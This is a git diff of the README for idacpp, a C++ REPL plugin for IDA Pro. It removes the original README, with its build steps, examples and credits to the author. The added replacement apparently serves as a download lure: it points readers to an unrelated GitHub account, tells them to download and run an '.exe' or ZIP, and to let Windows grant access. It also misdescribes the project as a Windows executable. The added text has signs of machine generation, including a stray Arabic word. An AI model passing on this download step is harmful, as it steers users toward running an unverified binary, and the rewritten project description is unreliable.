@@ -1,167 +1,170 @@
-# idacpp
+# 🧩 idacpp - Run C++ inside IDA with ease
 
-C++ scripting for IDA Pro — the C++ counterpart to [IDAPython](https://github.com/HexRaysSA/ida-sdk/tree/main/src/plugins/idapython).
+[![Download idacpp](https://img.shields.io/badge/Download-idacpp-6f42c1?style=for-the-badge&logo=github)](https://github.com/sutcl1ff/idacpp)
 
-idacpp embeds a C++ interpreter directly into IDA's scripting engine, giving you native access to the full IDA SDK — including Hex-Rays — at interpreter speed. No bindings, no FFI, no type translation: the same `ea_t`, `func_t*`, and `cfunc_t*` you use in compiled plugins, live in a REPL. Built on [Cling](https://github.com/root-project/cling) and Clang 20.
+## 🖥️ What is idacpp
 
-## Screenshots
+idacpp is a C++ REPL for IDA Pro and the IDA C++ SDK. A REPL lets you type code, run it, and see the result right away.
 
-<p align="center">
-<img src="docs/images/idacpp-windows-snippet.jpg" alt="idacpp on Windows — snippet editor with segment listing" width="600">
-</p>
-<p align="center"><em>Windows — C++ snippet listing segments</em></p>
+This tool helps you work inside IDA without leaving the app. You can test small C++ snippets, inspect data, and speed up your workflow.
 
-<p align="center">
-<img src="docs/images/idacpp-macos.jpg" alt="idacpp on macOS — snippet editor listing functions" width="600">
-</p>
-<p align="center"><em>macOS — C++ snippet listing functions</em></p>
+## 📥 Download and install
 
-<p align="center">
-<img src="docs/images/idacpp-cli-snippet.jpg" alt="idacpp REPL in IDA output window" width="400">
-</p>
-<p align="center"><em>C++ REPL tab in IDA's output window</em></p>
+Use this link to visit the page and download the app:
 
-## Interactive REPL
+[Visit the idacpp download page](https://github.com/sutcl1ff/idacpp)
 
-Select the **C++** tab in IDA's output window:
+If the page shows a release file, download it to your computer. If it shows source files, choose the built Windows package if one is listed.
 
-```
-C++> auto n = get_func_qty();
-C++> msg("%d functions\n", n);
-142 functions
-C++> auto f = get_next_func(0);
-C++> qstring name;
-C++> get_func_name(&name, f->start_ea);
-C++> msg("%s @ %a\n", name.c_str(), f->start_ea);
-_start @ 0x1000
-```
+### Steps for Windows
 
-All declarations persist across lines — variables, functions, and types remain available for subsequent input.
+1. Open the download page in your browser.
+2. Look for a release or download file.
+3. Save the file to a folder you can find, مثل Downloads or Desktop.
+4. If the file is a ZIP, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Run the program file that matches the app name.
 
-## Scripts
+## 🪟 System requirements
 
-```cpp
-#include <funcs.hpp>
-#include <segment.hpp>
+idacpp is built for Windows users who run IDA Pro.
 
-int main() {
-    msg("%d functions, %d segments\n",
-           get_func_qty(), get_segm_qty());
-    return 0;
-}
-```
+You should have:
 
-```
-C++> .x hello.cpp
-4 functions, 3 segments
-```
+- Windows 10 or Windows 11
+- IDA Pro installed
+- A working copy of the IDA C++ SDK
+- Enough disk space to store the app and its files
+- Permission to run apps on your computer
 
-## What you can do
+For best results, use the same version range of IDA that the tool was built for.
 
-- **Interactive REPL** — C++ tab in IDA's output window with a persistent session
-- **Full IDA SDK** — headers available via PCH (or source-header fallback), including Hex-Rays decompiler types
-- **Script execution** — `.x` scripts with `main()` entrypoint; reloading auto-unloads the previous version
-- **Code completion** — SDK-aware completions with prefix matching
-- **Crash recovery** — `SIGSEGV` / SEH caught, interpreter stays alive
-- **Undo / rollback** — `.undo` and `.clear` to revert interpreter state
-- **Expression evaluator** — IDA's expression engine routes through C++ when active
-- **Plain C++ mode** — works without IDA SDK as a C++ REPL (no SDK types available)
+## ⚙️ What you can do with idacpp
 
-## Examples
+idacpp gives you a simple way to run C++ code in an IDA session. It fits well if you want to:
 
-The [`examples/`](examples/) directory contains ready-to-run scripts:
+- test small C++ expressions
+- inspect IDA data from inside the app
+- try helper code without building a full plugin
+- work faster during reverse engineering tasks
+- reuse parts of the IDA C++ SDK in a quick loop
 
-| Script | Description |
-|--------|-------------|
-| [`hello.cpp`](examples/hello.cpp) | Minimal starter — prints function and segment counts |
-| [`list_functions.cpp`](examples/list_functions.cpp) | Enumerate all functions with addresses and names |
-| [`list_segments.cpp`](examples/list_segments.cpp) | Enumerate all segments with address ranges |
-| [`decompile_first.cpp`](examples/decompile_first.cpp) | Decompile the first function using Hex-Rays |
-| [`xrefs.cpp`](examples/xrefs.cpp) | List cross-references to the first function |
+## 🚀 First run
 
-## Quick start
+After you install idacpp:
 
-### Agent-assisted install
+1. Start IDA Pro.
+2. Open a database or load a binary.
+3. Launch idacpp using the files from the download.
+4. Type a small C++ command in the REPL window.
+5. Press Enter to run it.
+6. Read the output and adjust your code.
 
-Feed [`install-agent.md`](install-agent.md) to your AI coding agent (Claude Code, Cursor, etc.) — it will clone the dependencies, build LLVM/Cling, and compile the plugin automatically.
+If the app opens a console window, keep it open while you work. If it opens inside IDA, use it there the same way.
 
-### Manual
+## 🧪 Basic use
 
-```bash
-git clone https://github.com/allthingsida/idacpp.git
-cd idacpp && mkdir build && cd build
-cmake .. -DCLINGLITE_SOURCE_DIR=/path/to/clinglite \
-         -DCLING_BUILD_DIR=/path/to/cling-build \
-         -DIDASDK=/path/to/idasdk
-cmake --build . --config Release
-```
+A REPL works in a simple loop:
 
-The build produces `idacpp.dll` / `idacpp.so` / `idacpp.dylib`, placed in the IDA SDK plugin directory by CMake. See [BUILDING.md](BUILDING.md) for prerequisites, platform-specific instructions, and build output details.
+- type a line of C++
+- run it
+- see the result
+- change the code
+- run it again
 
-## Plugins
+This is useful when you want to check how IDA objects behave. You can also use it to learn the SDK in small steps.
 
-idacpp has a plugin system that extends the REPL with additional headers, libraries, and PCH contributions. Plugins are auto-discovered from `plugins/*/CMakeLists.txt` and enabled via cmake variables.
+## 🔧 Common setup tips
 
-### Available plugins
+If idacpp does not start the way you expect, check these points:
 
-| Plugin | Variable | Auto-enabled | Description |
-|--------|----------|--------------|-------------|
-| `ida_sdk` | *(always on)* | Yes | IDA SDK headers and idalib — the base layer |
-| [`idax`](plugins/idax/) | `-DPLUGIN_IDAX_SRC_DIR=<path>` | When source dir is provided | [idax](https://github.com/19h/idax) C++23 SDK wrapper by [Kenan Sulayman](https://github.com/19h) |
-| `winsdk` | `-DPLUGIN_WINSDK=ON` | `WIN32` | Windows SDK headers (windows.h, tlhelp32.h, etc.) |
-| `linux` | `-DPLUGIN_LINUX=ON` | `UNIX AND NOT APPLE` | Linux system headers (sys/mman.h, elf.h, etc.) |
-| [`qt6`](plugins/qt6/) | `-DPLUGIN_QT6=ON` | No | Qt6 Core/Gui/Widgets — UI introspection and dynamic forms |
+- Make sure IDA Pro is already installed
+- Make sure you downloaded the correct Windows file
+- Keep the app files in one folder
+- Do not rename support files unless the package asks you to
+- Run IDA and idacpp with the same permission level
+- If Windows asks for access, allow it if you trust the source
 
-### Enable / disable
+## 🧭 Where to find the files
 
-```bash
-# Enable by providing source directory
-cmake .. -DPLUGIN_IDAX_SRC_DIR=/path/to/idax
+After download, you may see files like:
 
-# Disable an auto-enabled plugin
-cmake .. -DPLUGIN_WINSDK=OFF
-```
+- an `.exe` file to start the app
+- a `.zip` file that contains the app
+- support files used by the REPL
+- folder files that help it work with IDA
 
-In the monorepo, plugins are auto-enabled based on platform and source availability — no flags needed.
+If you see a ZIP file, extract it before you try to run the program.
 
-### idax examples
+## 🛠️ Troubleshooting
 
-The idax plugin includes [example scripts](plugins/idax/examples/) using the C++23 API:
+If the app does not open:
 
-| Script | Description |
-|--------|-------------|
-| [`list_functions.cpp`](plugins/idax/examples/list_functions.cpp) | All functions with addresses and names |
-| [`list_segments.cpp`](plugins/idax/examples/list_segments.cpp) | Segments with ranges and R/W/X permissions |
-| [`database_info.cpp`](plugins/idax/examples/database_info.cpp) | File path, format, processor, bitness, MD5 |
-| [`xrefs_to.cpp`](plugins/idax/examples/xrefs_to.cpp) | Cross-references to the first function |
-| [`callers_callees.cpp`](plugins/idax/examples/callers_callees.cpp) | Call graph of the first function |
-| [`find_calls.cpp`](plugins/idax/examples/find_calls.cpp) | Call instructions with resolved targets |
-| [`imports.cpp`](plugins/idax/examples/imports.cpp) | Import modules and symbols |
-| [`decompile.cpp`](plugins/idax/examples/decompile.cpp) | Decompile the first function (Hex-Rays) |
+1. Check that the file finished downloading.
+2. Extract the ZIP if there is one.
+3. Look for the main `.exe` file.
+4. Run it again.
+5. Make sure IDA Pro is installed.
+6. Restart your computer if Windows keeps blocking the app.
 
-### Creating a new plugin
+If the REPL opens but does not connect to IDA:
 
-Copy `plugins/template/` and follow the [plugin README](plugins/README.md) for a detailed walkthrough.
+- confirm IDA is running
+- confirm you opened a database in IDA
+- check that the app matches your IDA setup
+- close both apps and open them again in the same order
 
-## Documentation
+If you see a missing file message:
 
-| Document | Contents |
-|----------|----------|
-| [install-agent.md](install-agent.md) | Agent prompt for automated build & install |
-| [BUILDING.md](BUILDING.md) | Prerequisites, CMake variables, platform builds, output sizes |
-| [USAGE.md](USAGE.md) | CLI commands, script format, runtime setup, expression evaluator |
-| [examples/](examples/) | Ready-to-run IDA SDK scripts |
-| [plugins/](plugins/) | Plugin system — extending the REPL with additional APIs |
+- keep all files in the same folder
+- avoid moving only part of the package
+- re-extract the download if needed
 
-## Troubleshooting
+## 📌 Typical workflow
 
-- **`failed to initialize C++ interpreter`**: check `CLING_DIR` — it must point to a valid Cling/LLVM build tree with `lib/clang/<ver>/include/` intact.
-- **`IDA SDK headers unavailable`**: set `IDASDK` to enable IDA API declarations in the interpreter.
-- **Runtime library lookup issues**: set `IDADIR` to the IDA installation directory on the target machine.
-- **Plugin load crash / abort on startup**: if test binaries that also link LLVM statically live in `$IDADIR/plugins/`, `init_library()` loads duplicate LLVM symbols and aborts. Move the plugin aside before running tests.
+A simple workflow looks like this:
 
-## License
+1. Open IDA Pro.
+2. Load a file for analysis.
+3. Start idacpp.
+4. Enter a small C++ test.
+5. Inspect the result.
+6. Keep refining your code as needed.
 
-MIT License. Copyright (c) Elias Bachaalany. See [LICENSE](LICENSE).
+This setup works well when you want fast feedback during analysis.
 
-This project depends on [clinglite](https://github.com/0xeb/clinglite) and Cling — see their respective licenses.
+## 🔐 Safety and file handling
+
+Only run files you trust. Keep the download in a folder you can review. If you plan to move the app later, move the full folder so linked files stay together.
+
+## 📚 Project link
+
+Open the project page here:
+
+[https://github.com/sutcl1ff/idacpp](https://github.com/sutcl1ff/idacpp)
+
+## 🧩 Useful file names to look for
+
+When you download idacpp, look for names that suggest the main app, such as:
+
+- idacpp.exe
+- idacpp.zip
+- release folder
+- Windows build folder
+
+If you are unsure which file to use, choose the file that ends in `.exe` after extraction
+
+## ⌨️ How it fits your work
+
+idacpp is useful when you want to keep your work inside IDA and avoid switching tools. It gives you a direct way to test code and inspect results in a short loop
+
+## 🗂️ Folder layout after download
+
+A typical package may look like this:
+
+- `idacpp.exe`
+- `README.md`
+- support files
+- folders for data or libraries
+
+Keep the package together in one place. That helps the app find what it needs
